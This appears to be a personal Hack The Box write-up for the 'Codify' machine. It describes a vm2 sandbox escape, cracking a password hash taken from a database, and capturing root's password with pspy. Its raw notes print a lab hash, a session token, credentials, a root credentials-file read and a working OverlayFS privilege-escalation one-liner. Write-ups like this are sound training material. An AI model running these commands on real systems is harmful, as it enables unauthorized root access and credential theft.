# Information
- CTF Name: Codify
- CTF Level: Easy
- CTF Description: 
- Date: 4/4/2024
- Platform: HTB
- Category: Machine

# Findings

## External
### Enumeration
- I did a simple nmap scan and got 3 ports open `22`,`80` and `3000`
![](https://i.imgur.com/Ka3D1EL.png)
- There is Same Website on both Port 80 and 3000, so let use the port 80.
- The website is a node.js Code editor and runner and it uses a library called `vm2` to sandbox the code runner from the system, this will prevent attacks from executing system command on the machine/server.
	- ![](https://i.imgur.com/jVtoEf3.png)
- The Problem is this site is using a vulnerable version of `vm2` the version is `3.9.16`
- ![](https://i.imgur.com/BUhr4iu.png)
- This Exploit will Escape some Restricted codes by the library 
	- child_process
	- fs
- I Started my `netcat` listener
	- ![](https://i.imgur.com/cjSLPAA.png)
- Then I Executed the vm2 exploit ![](https://i.imgur.com/2mN8qzj.png)
### Gaining Access 
- I Got access the the `svc` user. Hurray!!
- ![](https://i.imgur.com/yx2k48z.png)
- It is really Easy foothold took 5min i think
## Internal
### Enumeration
- I tried to check special folders and got a specials and i got the web hosted Directories inside `/var/www` i try to check all the files and i got the file called `tickets.db`. 
	- Good For us, this database file contains the username and password hash for the user `joshua`.
![](https://i.imgur.com/1NT3hgS.png)

### Gaining Access
- I Copied the hash and tried to crack it with john.
	- ![](https://i.imgur.com/Ryj5psw.png)
- Well Done, we got the password for the user `joshua`
- ![](https://i.imgur.com/GoLANVA.png)
- We are In to the User `joshua`!
- Then we got the `user.txt` flag.
### Maintaining Access
- On the 1st i tried to footprint the system and saw that the kernel version is old and i thought it can be exploited with dirtypipe and i spent some min on it, then i jumped to another findings.
- While Enumerating the new account files and folders, i got some eye catchy file `/opt/scripts/mysql-backup.sh`
```
#!/bin/bash                                                                                                                                                                                                                                   
DB_USER="root"                                           
DB_PASS=$(/usr/bin/cat /root/.creds)                         
BACKUP_DIR="/var/backups/mysql"                                
read -s -p "Enter MySQL password for $DB_USER: " USER_PASS  

/usr/bin/echo  
if [[ $DB_PASS == $USER_PASS ]]; then  
        /usr/bin/echo "Password confirmed!"   
else                           
        /usr/bin/echo "Password confirmation failed!"     
        exit 1   
fi   


/usr/bin/mkdir -p "$BACKUP_DIR" 
databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)") 

for db in $databases; do    
    /usr/bin/echo "Backing up database: $db"    
    /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"  
done 
```


- On this Code, is trying to fetch the DB_PASS from the root .creds file and passing it to the database  variable down on the code, so the thing i thought it, so.... if that happens there will be some process at the background so, if i started 2 ssh shells and i started a process viewer tools like pspy64 and run the script on the another screen i will get the password. so i tried that and guess what.. it worked!!!!!!
- 
	![](https://i.imgur.com/ZueySeO.png)
	- ![](https://i.imgur.com/1NPAhxa.png)
- Then I logged in to this user with `ssh root@codify.htb` and this password then boom. We got the root flag.
# Random Notes
- Codify uses sandboxing technology to run your code
- Whitelisted module
	- - url
	- crypto
	- util
	- events
	- assert
	- stream
	- path
	- os
	- zlib
- BlackListed
	- child_process
	- fs


- some exploit
	
- ![](https://i.imgur.com/2mN8qzj.png)

- ![](https://i.imgur.com/6RBogtk.png)
- `joshua$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2`
 -
![](https://i.imgur.com/fTqC6Q0.png)

- Sessions: `G3U9SHG29S872HA028DH278D9178D90A782GH`
![](https://i.imgur.com/KRxswW7.png)


/opt/scripts/mysql-backup.sh
mysql  Ver 8.0.35-0ubuntu0.22.04.1 for Linux on x86_64 ((Ubuntu))
/usr/bin/mysql -u root -h 0.0.0.0 -P 3306 -p -e SHOW DATABASES;
/var/backups/mysql

/usr/bin/cat /root/.creds
Creds
josua : spongebob1

```bash fold
#!/bin/bash                                                                                                                                                                                                                                   
DB_USER="root"                                           
DB_PASS=$(/usr/bin/cat /root/.creds)                         
BACKUP_DIR="/var/backups/mysql"                                
read -s -p "Enter MySQL password for $DB_USER: " USER_PASS  

/usr/bin/echo  
if [[ $DB_PASS == $USER_PASS ]]; then  
        /usr/bin/echo "Password confirmed!"   
else                           
        /usr/bin/echo "Password confirmation failed!"     
        exit 1   
fi   


/usr/bin/mkdir -p "$BACKUP_DIR" 
databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)") 

for db in $databases; do    
    /usr/bin/echo "Backing up database: $db"    
    /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"  
done 
```

unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;  
setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'


/srv/.viminfo

mysql  Ver 8.0.35-0ubuntu0.22.04.1 for Linux on x86_64 ((Ubuntu))


kljh12k3jhaskjh12kjh3

![](https://i.imgur.com/bgNj742.png)
